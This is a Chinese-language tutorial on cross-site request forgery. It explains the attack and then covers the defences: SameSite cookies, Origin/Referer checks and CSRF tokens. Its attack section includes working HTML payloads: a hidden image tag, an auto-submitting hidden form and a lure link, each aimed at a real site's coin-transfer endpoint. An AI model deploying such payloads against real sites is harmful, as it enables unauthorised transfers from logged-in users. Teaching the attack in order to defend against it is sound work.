> CSRF（Cross-site request forgery）“跨站请求伪造”，是指 **黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。**



CSRF 攻击之所以能够成功，是因为 **黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。**

--------



## CSRF攻击方式

通常当用户打开了黑客的页面后，黑客有三种方式去实施 CSRF 攻击。

==本质上是利用标签发起请求不受同源策略限制的BUG==

==不能获取cookie，但发送请求时会携带cookie==

### 1. 自动发起 Get 请求

如下所示黑客页面的 HTML 代码，在这段代码中，黑客将转账的请求接口隐藏在 img 标签内。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用户账户上的 100 极客币就被转移到黑客的账户上去了。

~~~html
<!DOCTYPE html>
<html>
  <body>
    <h1>黑客的站点：CSRF攻击演示</h1>
    <img src="https://time.geekbang.org/sendcoin?user=hacker&number=100">
  </body>
</html>
~~~

### 2. 自动发起 POST 请求

除了自动发送 Get 请求之外，有些服务器的接口是使用 POST 方法的，所以黑客还需要在他的站点上伪造 POST 请求，当用户打开黑客的站点时，自动提交 POST 请求：

~~~html
<!DOCTYPE html>
<html>
<body>
  <h1>黑客的站点：CSRF攻击演示</h1>
  <form id='hacker-form' action="https://time.geekbang.org/sendcoin" method=POST>
    <input type="hidden" name="user" value="hacker" />
    <input type="hidden" name="number" value="100" />
  </form>
  <script> document.getElementById('hacker-form').submit(); </script>
</body>
</html>
~~~

可以看到黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是极客时间的转账接口。当用户打开该站点之后，这个表单会被自动执行提交。

### 3. 引诱用户点击链接

除了自动发起 Get 和 Post 请求之外，还有一种方式是诱惑用户点击黑客站点上的链接。

~~~htmL
<div>
  <img width=150 src=http://images.xuejuzi.cn/1612/1_161230185104_1.jpg> </img> </div> <div>
  <a href="https://time.geekbang.org/sendcoin?user=hacker&number=100" taget="_blank">
    点击下载美女照片
  </a>
</div>
~~~



## 防止CSRF攻击

CSRF 攻击的三个必要条件：

+ 第一个，目标站点一定要有 CSRF 漏洞；
+ 第二个，用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；
+ 第三个，需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。

满足以上三个条件之后，黑客就可以对用户进行 CSRF 攻击了。

-------

要让服务器避免遭受到 CSRF 攻击，通常有以下几种途径。

### 1. Cookie 的 SameSite 属性

在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项，如下：

~~~http
set-cookie: 1P_JAR=2019-10-20-06; expires=Tue, 19-Nov-2019 06:36:21 GMT; path=/; domain=.google.com; SameSite=none
~~~

当 Cookie 设置了 SameSite = Strict 的话，那么浏览器完全禁止第三方请求携带Cookie。



### 2. 验证请求的来源站点

由于 CSRF 攻击大多来自于第三方站点，因此服务器可以禁止来自第三方站点的请求。

通过请求头中的 Origin 和 Referer 字段来判断请求是否来自第三方站点。其中，Referer 包含了具体的 URL 路径，而 Origin 只包含域名信息。服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值。

![img](https://static001.geekbang.org/resource/image/15/c9/159430e9d15cb7bcfa4fd014da31a2c9.png?wh=1142*816)

![img](https://static001.geekbang.org/resource/image/25/03/258dc5542db8961aaa23ec0c02030003.png?wh=1142*864)



### 3. CSRF Token

第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。

~~~html
<!DOCTYPE html>
<html>
<body>
    <form action="https://time.geekbang.org/sendcoin" method="POST">
      <input type="hidden" name="csrf-token" value="nc98P987bcpncYhoadjoiydc9ajDlcn">
      <input type="text" name="user">
      <input type="text" name="number">
      <input type="submit">
    </form>
</body>
</html>
~~~

第二步，在 HTTP 请求中以参数的形式加入 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。



